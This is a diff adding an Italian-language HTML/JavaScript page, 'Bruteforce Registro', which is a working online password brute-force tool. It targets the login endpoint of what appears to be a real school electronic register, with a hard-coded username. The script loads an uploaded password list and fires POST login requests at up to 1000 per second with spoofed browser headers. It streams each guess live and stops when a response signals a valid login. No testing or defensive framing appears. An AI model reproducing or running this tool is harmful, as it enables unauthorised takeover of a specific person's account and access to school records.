@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bruteforce Registro · Live Password View</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            background: #111111;
+            border-radius: 24px;
+            padding: 32px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+        }
+
+        .subtitle {
+            color: #666666;
+            font-size: 14px;
+            margin-bottom: 32px;
+            border-bottom: 1px solid #2a2a2a;
+            padding-bottom: 20px;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: #cccccc;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 12px 16px;
+            background: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 14px;
+            font-size: 15px;
+            color: #ffffff;
+            transition: all 0.2s;
+            outline: none;
+        }
+
+        input[type="number"] {
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        input[type="text"]:focus, input[type="number"]:focus {
+            border-color: #666666;
+            background: #1f1f1f;
+        }
+
+        .power-control {
+            background: #0a0a0a;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .power-slider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 16px 0 8px;
+        }
+
+        .slider-label {
+            color: #888888;
+            font-size: 13px;
+            min-width: 45px;
+        }
+
+        .slider-label:last-child {
+            text-align: right;
+        }
+
+        input[type="range"] {
+            flex: 1;
+            height: 6px;
+            -webkit-appearance: none;
+            background: #1a1a1a;
+            border-radius: 100px;
+            outline: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            background: #ffffff;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: 0.1s;
+            border: 2px solid #000000;
+        }
+
+        input[type="range"]::-webkit-slider-thumb:hover {
+            transform: scale(1.15);
+            background: #f0f0f0;
+        }
+
+        .power-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 24px;
+            font-weight: 600;
+            color: #ffffff;
+            text-align: center;
+            margin: 8px 0;
+        }
+
+        .single-test-panel {
+            background: #0a0a0a;
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .test-row {
+            display: flex;
+            gap: 12px;
+            margin: 16px 0;
+        }
+
+        .test-row input {
+            flex: 1;
+        }
+
+        .btn-small {
+            padding: 12px 24px;
+            background: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 100px;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .btn-small:hover {
+            border-color: #666666;
+            background: #2a2a2a;
+        }
+
+        .password-mode {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .mode-btn {
+            flex: 1;
+            min-width: 140px;
+            padding: 14px 20px;
+            background: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 100px;
+            color: #888888;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .mode-btn.active {
+            background: #ffffff;
+            border-color: #ffffff;
+            color: #000000;
+        }
+
+        .file-upload-area {
+            border: 2px dashed #333333;
+            border-radius: 24px;
+            padding: 32px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: #0a0a0a;
+            margin-bottom: 24px;
+        }
+
+        .file-upload-area:hover {
+            border-color: #666666;
+            background: #0f0f0f;
+        }
+
+        .file-upload-area svg {
+            width: 48px;
+            height: 48px;
+            stroke: #666666;
+            margin-bottom: 12px;
+        }
+
+        .file-upload-area p {
+            color: #888888;
+            font-size: 14px;
+        }
+
+        .file-upload-area .filename {
+            color: #ffffff;
+            font-weight: 500;
+            margin-top: 8px;
+            font-size: 15px;
+        }
+
+        .file-info {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-top: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            color: #888888;
+            border: 1px solid #2a2a2a;
+        }
+
+        .file-info span {
+            color: #ffffff;
+            font-weight: 500;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .controls {
+            display: flex;
+            gap: 12px;
+            margin: 24px 0;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 100px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+
+        .btn-primary {
+            background: #ffffff;
+            color: #000000;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #e0e0e0;
+            transform: scale(0.98);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #666666;
+            border: 1px solid #333333;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            border-color: #666666;
+            color: #ffffff;
+        }
+
+        .btn-danger {
+            background: #330000;
+            color: #ff6666;
+            border: 1px solid #660000;
+        }
+
+        .btn-danger:hover:not(:disabled) {
+            background: #440000;
+            border-color: #ff3333;
+        }
+
+        .stats-panel {
+            background: #0a0a0a;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 24px 0;
+            border: 1px solid #2a2a2a;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #666666;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+            margin-bottom: 4px;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ffffff;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .stat-unit {
+            font-size: 14px;
+            color: #666666;
+            margin-left: 2px;
+        }
+
+        .response-box {
+            background: #000000;
+            border-radius: 16px;
+            padding: 16px;
+            border: 1px solid #2a2a2a;
+            margin-top: 12px;
+        }
+
+        .response-title {
+            font-size: 12px;
+            color: #666666;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+
+        .response-content {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: #00ff00;
+            word-break: break-all;
+        }
+
+        .response-content.error {
+            color: #ff3333;
+        }
+
+        .response-content.warning {
+            color: #ffff00;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 100px;
+            overflow: hidden;
+            margin: 16px 0 8px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #ffffff;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+
+        .live-passwords {
+            margin-top: 20px;
+            border: 1px solid #2a2a2a;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .live-header {
+            background: #1a1a1a;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .live-header h3 {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+
+        .live-header span {
+            color: #888888;
+            font-size: 13px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .password-stream {
+            background: #0a0a0a;
+            max-height: 250px;
+            overflow-y: auto;
+            padding: 8px;
+        }
+
+        .password-stream-item {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            padding: 6px 12px;
+            margin: 2px 0;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            animation: fadeIn 0.2s;
+            border-left: 3px solid transparent;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .password-stream-item.testing {
+            background: #1a1a1a;
+            border-left-color: #ffff00;
+            color: #ffff00;
+        }
+
+        .password-stream-item.success {
+            background: #003300;
+            border-left-color: #00ff00;
+            color: #00ff00;
+        }
+
+        .password-stream-item.error {
+            background: #330000;
+            border-left-color: #ff3333;
+            color: #ff6666;
+        }
+
+        .password-stream-item .pwd {
+            font-weight: 500;
+        }
+
+        .password-stream-item .status {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+
+        .test-result {
+            margin-top: 12px;
+            padding: 12px;
+            background: #000000;
+            border-radius: 14px;
+            font-size: 13px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .password-stats {
+            display: flex;
+            gap: 16px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #666666;
+        }
+
+        .password-stats span {
+            color: #ffffff;
+            font-family: 'JetBrains Mono', monospace;
+            margin-left: 4px;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 100px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #333333;
+            border-radius: 100px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #444444;
+        }
+
+        @media (max-width: 700px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+            
+            .stat-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .test-row {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ LIVE PASSWORD STREAM ⚡</h1>
+        <div class="subtitle">Registro Elettronico Orsoline · Test in tempo reale · Password visibili</div>
+        
+        <div class="grid-2">
+            <!-- Power Control -->
+            <div class="power-control">
+                <label>POTENZA ATTACK (REQUEST/SEC)</label>
+                <div class="power-value" id="powerValue">200</div>
+                <div class="power-slider">
+                    <span class="slider-label">🐢 50</span>
+                    <input type="range" id="powerSlider" min="50" max="1000" value="200" step="10">
+                    <span class="slider-label">🚀 1000</span>
+                </div>
+                <div class="password-stats">
+                    <div>Batch: <span id="batchSize">500</span></div>
+                    <div>Timeout: <span id="timeoutValue">1.5</span>s</div>
+                    <div>Concorrenza: <span id="concurrencyValue">200</span></div>
+                </div>
+            </div>
+            
+            <!-- Single Password Test -->
+            <div class="single-test-panel">
+                <label>TEST SINGOLA PASSWORD</label>
+                <div class="test-row">
+                    <input type="text" id="singlePassword" placeholder="Inserisci password da testare">
+                    <button class="btn-small" id="testSingleBtn">▶ TEST</button>
+                </div>
+                <div id="singleTestResult" class="test-result" style="display: none;"></div>
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <label>USERNAME</label>
+            <input type="text" id="username" value="dedaloroma130774" placeholder="Inserisci username">
+        </div>
+        
+        <div class="password-mode">
+            <button class="mode-btn" id="autoModeBtn">🔲 GENERA AUTOMATICA</button>
+            <button class="mode-btn active upload-mode" id="uploadModeBtn">📁 UPLOAD LISTA</button>
+        </div>
+        
+        <div id="uploadArea">
+            <div class="file-upload-area" id="fileDropArea">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                    <polyline points="17 8 12 3 7 8"/>
+                    <line x1="12" y1="3" x2="12" y2="15"/>
+                </svg>
+                <p>Trascina qui il tuo file .txt con le password</p>
+                <p style="font-size: 12px; color: #444444;">oppure clicca per selezionare</p>
+                <div class="filename" id="fileName"></div>
+                <input type="file" id="fileInput" accept=".txt" style="display: none;">
+            </div>
+            <div class="file-info" id="fileInfo" style="display: none;">
+                <span>📊 STATISTICHE LISTA:</span>
+                <span id="totalPasswords">0</span> password caricate |
+                <span id="testedPasswords">0</span> testate |
+                <span id="remainingPasswords">0</span> rimanenti
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="btn btn-primary" id="startBtn">▶ AVVIA ATTACK</button>
+            <button class="btn btn-secondary" id="stopBtn" disabled>⏹ FERMA</button>
+            <button class="btn btn-danger" id="clearBtn">🗑 RESET</button>
+        </div>
+        
+        <div class="stats-panel">
+            <div class="stat-grid">
+                <div class="stat-item">
+                    <div class="stat-label">Tentativi</div>
+                    <div class="stat-value"><span id="attempts">0</span></div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Velocità</div>
+                    <div class="stat-value"><span id="speed">0</span><span class="stat-unit">/s</span></div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Tempo</div>
+                    <div class="stat-value"><span id="time">0.0</span><span class="stat-unit">s</span></div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Rimaste</div>
+                    <div class="stat-value"><span id="remainingCount">0</span></div>
+                </div>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar"></div>
+            </div>
+            
+            <div class="response-box">
+                <div class="response-title">ULTIMA RESPONSE</div>
+                <div class="response-content" id="lastResponse">nessuna response</div>
+            </div>
+        </div>
+
+        <!-- LIVE PASSWORD STREAM -->
+        <div class="live-passwords">
+            <div class="live-header">
+                <h3>🔴 LIVE PASSWORD STREAM</h3>
+                <span>Test in tempo reale <span id="streamCount">0</span>/s</span>
+            </div>
+            <div class="password-stream" id="passwordStream">
+                <div class="password-stream-item">
+                    <span class="pwd">Carica una lista di password per iniziare</span>
+                    <span class="status"></span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        class BruteforceAttack {
+            constructor() {
+                this.attempts = 0;
+                this.found = false;
+                this.running = false;
+                this.startTime = null;
+                this.speed = 0;
+                this.currentPassword = '';
+                this.lastResponse = '';
+                this.passwordList = [];
+                this.originalPasswordList = [];
+                this.usedPasswords = new Set();
+                this.username = 'dedaloroma130774';
+                this.powerLevel = 200;
+                this.activeRequests = 0;
+                this.testResult = null;
+                this.passwordHistory = [];
+                this.maxHistoryItems = 50;
+                this.testedCount = 0;
+                
+                // Elementi DOM
+                this.elements = {
+                    attempts: document.getElementById('attempts'),
+                    speed: document.getElementById('speed'),
+                    time: document.getElementById('time'),
+                    remainingCount: document.getElementById('remainingCount'),
+                    lastResponse: document.getElementById('lastResponse'),
+                    progressBar: document.getElementById('progressBar'),
+                    startBtn: document.getElementById('startBtn'),
+                    stopBtn: document.getElementById('stopBtn'),
+                    clearBtn: document.getElementById('clearBtn'),
+                    username: document.getElementById('username'),
+                    autoModeBtn: document.getElementById('autoModeBtn'),
+                    uploadModeBtn: document.getElementById('uploadModeBtn'),
+                    uploadArea: document.getElementById('uploadArea'),
+                    fileDropArea: document.getElementById('fileDropArea'),
+                    fileInput: document.getElementById('fileInput'),
+                    fileName: document.getElementById('fileName'),
+                    fileInfo: document.getElementById('fileInfo'),
+                    totalPasswords: document.getElementById('totalPasswords'),
+                    testedPasswords: document.getElementById('testedPasswords'),
+                    remainingPasswords: document.getElementById('remainingPasswords'),
+                    passwordStream: document.getElementById('passwordStream'),
+                    streamCount: document.getElementById('streamCount'),
+                    powerSlider: document.getElementById('powerSlider'),
+                    powerValue: document.getElementById('powerValue'),
+                    batchSize: document.getElementById('batchSize'),
+                    timeoutValue: document.getElementById('timeoutValue'),
+                    concurrencyValue: document.getElementById('concurrencyValue'),
+                    singlePassword: document.getElementById('singlePassword'),
+                    testSingleBtn: document.getElementById('testSingleBtn'),
+                    singleTestResult: document.getElementById('singleTestResult')
+                };
+                
+                this.initEventListeners();
+                this.updatePowerSettings();
+                
+                // Modal iniziale: upload mode attivo
+                this.elements.autoModeBtn.classList.remove('active');
+                this.elements.uploadModeBtn.classList.add('active');
+            }
+            
+            initEventListeners() {
+                this.elements.startBtn.addEventListener('click', () => this.startAttack());
+                this.elements.stopBtn.addEventListener('click', () => this.stopAttack());
+                this.elements.clearBtn.addEventListener('click', () => this.resetStats());
+                
+                // Power slider
+                this.elements.powerSlider.addEventListener('input', () => this.updatePowerSettings());
+                
+                // Modal switcher
+                this.elements.autoModeBtn.addEventListener('click', () => {
+                    this.elements.autoModeBtn.classList.add('active');
+                    this.elements.uploadModeBtn.classList.remove('active');
+                    this.elements.uploadArea.style.display = 'none';
+                });
+                
+                this.elements.uploadModeBtn.addEventListener('click', () => {
+                    this.elements.uploadModeBtn.classList.add('active');
+                    this.elements.autoModeBtn.classList.remove('active');
+                    this.elements.uploadArea.style.display = 'block';
+                });
+                
+                // File upload
+                this.elements.fileDropArea.addEventListener('click', () => {
+                    this.elements.fileInput.click();
+                });
+                
+                this.elements.fileDropArea.addEventListener('dragover', (e) => {
+                    e.preventDefault();
+                    this.elements.fileDropArea.style.borderColor = '#ffffff';
+                });
+                
+                this.elements.fileDropArea.addEventListener('dragleave', () => {
+                    this.elements.fileDropArea.style.borderColor = '#333333';
+                });
+                
+                this.elements.fileDropArea.addEventListener('drop', (e) => {
+                    e.preventDefault();
+                    this.elements.fileDropArea.style.borderColor = '#333333';
+                    const file = e.dataTransfer.files[0];
+                    this.handleFileUpload(file);
+                });
+                
+                this.elements.fileInput.addEventListener('change', (e) => {
+                    const file = e.target.files[0];
+                    this.handleFileUpload(file);
+                });
+                
+                // Single test
+                this.elements.testSingleBtn.addEventListener('click', () => this.testSinglePassword());
+                this.elements.singlePassword.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') this.testSinglePassword();
+                });
+            }
+            
+            updatePowerSettings() {
+                this.powerLevel = parseInt(this.elements.powerSlider.value);
+                this.elements.powerValue.textContent = this.powerLevel;
+                
+                const batchSize = Math.min(2000, Math.floor(this.powerLevel * 2.5));
+                const concurrency = Math.min(500, Math.floor(this.powerLevel * 0.8));
+                const timeout = Math.max(0.5, Math.min(3, 1500 / this.powerLevel)).toFixed(1);
+                
+                this.elements.batchSize.textContent = batchSize;
+                this.elements.concurrencyValue.textContent = concurrency;
+                this.elements.timeoutValue.textContent = timeout;
+                
+                this.batchSize = batchSize;
+                this.maxConcurrency = concurrency;
+                this.requestTimeout = timeout * 1000;
+            }
+            
+            async testSinglePassword() {
+                const password = this.elements.singlePassword.value.trim();
+                if (!password) {
+                    alert('Inserisci una password da testare');
+                    return;
+                }
+                
+                this.elements.testSingleBtn.disabled = true;
+                this.elements.testSingleBtn.textContent = 'TEST...';
+                
+                try {
+                    // Aggiungi allo stream
+                    this.addToStream(password, 'testing');
+                    
+                    const result = await this.tryPassword(password, true);
+                    
+                    if (result) {
+                        this.elements.singleTestResult.style.display = 'block';
+                        this.elements.singleTestResult.innerHTML = `✓ PASSWORD VALIDA! "${password}"<br><span style="color:#00ff00">Accesso consentito</span>`;
+                        this.elements.singleTestResult.style.color = '#00ff00';
+                        this.addToStream(password, 'success');
+                    } else {
+                        this.elements.singleTestResult.style.display = 'block';
+                        this.elements.singleTestResult.innerHTML = `✗ PASSWORD NON VALIDA "${password}"<br><span style="color:#ff6666">Accesso negato</span>`;
+                        this.elements.singleTestResult.style.color = '#ff6666';
+                        this.addToStream(password, 'error');
+                    }
+                    
+                } catch (error) {
+                    this.elements.singleTestResult.style.display = 'block';
+                    this.elements.singleTestResult.innerHTML = `⚠ ERRORE: ${error.message}`;
+                    this.elements.singleTestResult.style.color = '#ffff00';
+                    this.addToStream(password, 'error');
+                } finally {
+                    this.elements.testSingleBtn.disabled = false;
+                    this.elements.testSingleBtn.textContent = '▶ TEST';
+                }
+            }
+            
+            handleFileUpload(file) {
+                if (file && file.type === 'text/plain') {
+                    this.elements.fileName.textContent = file.name;
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        this.passwordList = e.target.result.split('\n')
+                            .map(p => p.trim())
+                            .filter(p => p.length > 0);
+                        this.originalPasswordList = [...this.passwordList];
+                        this.testedCount = 0;
+                        
+                        // Mostra info file
+                        this.elements.fileInfo.style.display = 'flex';
+                        this.elements.totalPasswords.textContent = this.passwordList.length;
+                        this.elements.testedPasswords.textContent = '0';
+                        this.elements.remainingPasswords.textContent = this.passwordList.length;
+                        
+                        // Mostra anteprima nello stream
+                        this.updateStreamWithList();
+                    };
+                    reader.readAsText(file);
+                } else {
+                    alert('Per favore carica un file .txt valido');
+                }
+            }
+            
+            updateStreamWithList() {
+                const preview = this.passwordList.slice(0, 10);
+                let html = '';
+                preview.forEach((pwd, index) => {
+                    html += `<div class="password-stream-item">
+                        <span class="pwd">${pwd}</span>
+                        <span class="status">IN ATTESA</span>
+                    </div>`;
+                });
+                
+                if (this.passwordList.length > 10) {
+                    html += `<div class="password-stream-item">
+                        <span class="pwd">... e altre ${this.passwordList.length - 10} password</span>
+                        <span class="status"></span>
+                    </div>`;
+                }
+                
+                this.elements.passwordStream.innerHTML = html || '<div class="password-stream-item"><span class="pwd">Nessuna password caricata</span></div>';
+            }
+            
+            addToStream(password, status) {
+                const item = document.createElement('div');
+                item.className = `password-stream-item ${status}`;
+                
+                let statusText = '';
+                switch(status) {
+                    case 'testing': statusText = 'TEST IN CORSO...'; break;
+                    case 'success': statusText = '✓ VALIDA'; break;
+                    case 'error': statusText = '✗ NON VALIDA'; break;
+                    default: statusText = '';
+                }
+                
+                item.innerHTML = `
+                    <span class="pwd">${password}</span>
+                    <span class="status">${statusText}</span>
+                `;
+                
+                this.elements.passwordStream.insertBefore(item, this.elements.passwordStream.firstChild);
+                
+                // Mantieni solo gli ultimi 50
+                while (this.elements.passwordStream.children.length > 50) {
+                    this.elements.passwordStream.removeChild(this.elements.passwordStream.lastChild);
+                }
+            }
+            
+            async tryPassword(password, isSingleTest = false) {
+                if (!isSingleTest && (this.found || !this.running)) return null;
+                
+                this.activeRequests++;
+                
+                try {
+                    this.currentPassword = password;
+                    if (!isSingleTest) {
+                        this.addToStream(password, 'testing');
+                    }
+                    
+                    const payload = {
+                        parametri: `{"username":"${this.username}","password":"${password}"}`
+                    };
+                    
+                    const controller = new AbortController();
+                    const timeoutMs = isSingleTest ? 5000 : this.requestTimeout;
+                    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
+                    
+                    const response = await fetch('https://registro.orsoline.it/Login.aspx/Autentica', {
+                        method: 'POST',
+                        headers: {
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'Accept': 'application/json, text/javascript, */*; q=0.01',
+                            'Content-Type': 'application/json; charset=UTF-8',
+                            'X-Requested-With': 'XMLHttpRequest',
+                            'Origin': 'https://registro.orsoline.it',
+                            'Referer': 'https://registro.orsoline.it/'
+                        },
+                        body: JSON.stringify(payload),
+                        signal: controller.signal
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    
+                    const text = await response.text();
+                    
+                    if (!isSingleTest) {
+                        this.lastResponse = text.substring(0, 100);
+                        this.attempts++;
+                        this.testedCount++;
+                        
+                        // Aggiorna item nello stream
+                        const success = text.includes('"d":"1"');
+                        const items = this.elements.passwordStream.children;
+                        for (let item of items) {
+                            if (item.querySelector('.pwd')?.textContent === password) {
+                                item.className = `password-stream-item ${success ? 'success' : 'error'}`;
+                                item.querySelector('.status').textContent = success ? '✓ VALIDA' : '✗ NON VALIDA';
+                                break;
+                            }
+                        }
+                    }
+                    
+                    if (text.includes('"d":"1"')) {
+                        if (!isSingleTest) {
+                            this.found = true;
+                            this.lastResponse = '✓ PASSWORD TROVATA! ' + text.substring(0, 50);
+                        }
+                        return true;
+                    }
+                    
+                    return false;
+                    
+                } catch (error) {
+                    if (!isSingleTest) {
+                        // Mostra errore nello stream
+                        const items = this.elements.passwordStream.children;
+                        for (let item of items) {
+                            if (item.querySelector('.pwd')?.textContent === password) {
+                                item.className = 'password-stream-item error';
+                                item.querySelector('.status').textContent = '⚠ ERRORE';
+                                break;
+                            }
+                        }
+                    } else {
+                        throw error;
+                    }
+                } finally {
+                    this.activeRequests--;
+                }
+                
+                return null;
+            }
+            
+            async startAttack() {
+                if (this.running) return;
+                if (this.passwordList.length === 0) {
+                    alert('Carica una lista di password prima di iniziare!');
+                    return;
+                }
+                
+                this.running = true;
+                this.found = false;
+                this.attempts = 0;
+                this.testedCount = 0;
+                this.startTime = Date.now();
+                this.username = this.elements.username.value || 'dedaloroma130774';
+                
+                this.elements.startBtn.disabled = true;
+                this.elements.stopBtn.disabled = false;
+                
+                // Reset stream
+                this.elements.passwordStream.innerHTML = '';
+                
+                // Avvia update timer
+                this.updateTimer = setInterval(() => this.updateUI(), 100);
+                
+                // Attack loop con visualizzazione live
+                while (this.running && !this.found && this.passwordList.length > 0) {
+                    const password = this.passwordList.shift(); // Prendi una password alla volta
+                    
+                    await this.tryPassword(password);
+                    
+                    // Aggiorna stats
+                    this.elements.remainingPasswords.textContent = this.passwordList.length;
+                    this.elements.testedPasswords.textContent = this.testedCount;
+                    
+                    // Controlla rate
+                    const elapsed = Date.now() - this.startTime;
+                    const expectedTime = (this.testedCount / this.powerLevel) * 1000;
+                    if (elapsed < expectedTime) {
+                        await new Promise(resolve => setTimeout(resolve, expectedTime - elapsed));
+                    }
+                }
+                
+                if (this.found) {
+                    this.elements.lastResponse.className = 'response-content';
+                    this.stopAttack();
+                } else if (this.passwordList.length === 0) {
+                    this.addToStream('📋 LISTA ESAURITA', 'error');
+                    this.stopAttack();
+                }
+            }
+            
+            stopAttack() {
+                this.running = false;
+                this.found = false;
+                this.elements.startBtn.disabled = false;
+                this.elements.stopBtn.disabled = true;
+                if (this.updateTimer) {
+                    clearInterval(this.updateTimer);
+                }
+                this.updateUI();
+            }
+            
+            resetStats() {
+                this.stopAttack();
+                this.attempts = 0;
+                this.found = false;
+                this.currentPassword = '';
+                this.lastResponse = '';
+                this.usedPasswords.clear();
+                this.passwordList = [];
+                this.originalPasswordList = [];
+                this.testedCount = 0;
+                
+                this.elements.fileName.textContent = '';
+                this.elements.fileInfo.style.display = 'none';
+                this.elements.singleTestResult.style.display = 'none';
+                this.elements.attempts.textContent = '0';
+                this.elements.speed.textContent = '0';
+                this.elements.time.textContent = '0.0';
+                this.elements.remainingCount.textContent = '0';
+                this.elements.lastResponse.textContent = 'nessuna response';
+                this.elements.progressBar.style.width = '0%';
+                
+                this.elements.passwordStream.innerHTML = `
+                    <div class="password-stream-item">
+                        <span class="pwd">Carica una lista di password per iniziare</span>
+                        <span class="status"></span>
+                    </div>
+                `;
+            }
+            
+            updateUI() {
+                if (this.startTime && this.running) {
+                    const elapsed = (Date.now() - this.startTime) / 1000;
+                    this.speed = Math.floor(this.attempts / Math.max(elapsed, 1));
+                    
+                    this.elements.attempts.textContent = this.attempts.toLocaleString();
+                    this.elements.speed.textContent = this.speed;
+                    this.elements.time.textContent = elapsed.toFixed(1);
+                    this.elements.remainingCount.textContent = this.passwordList.length;
+                    this.elements.streamCount.textContent = this.speed;
+                    
+                    // Progress bar
+                    if (this.originalPasswordList.length > 0) {
+                        const progress = (this.testedCount / this.originalPasswordList.length) * 100;
+                        this.elements.progressBar.style.width = progress + '%';
+                    }
+                }
+                
+                let responseClass = 'response-content';
+                if (this.lastResponse.includes('errore')) {
+                    responseClass = 'response-content error';
+                } else if (this.lastResponse.includes('d":"1')) {
+                    responseClass = 'response-content';
+                }
+                this.elements.lastResponse.className = responseClass;
+                this.elements.lastResponse.textContent = this.lastResponse || 'nessuna response';
+            }
+        }
+        
+        // Inizializza
+        const attack = new BruteforceAttack();
+    </script>
+</body>
+</html>
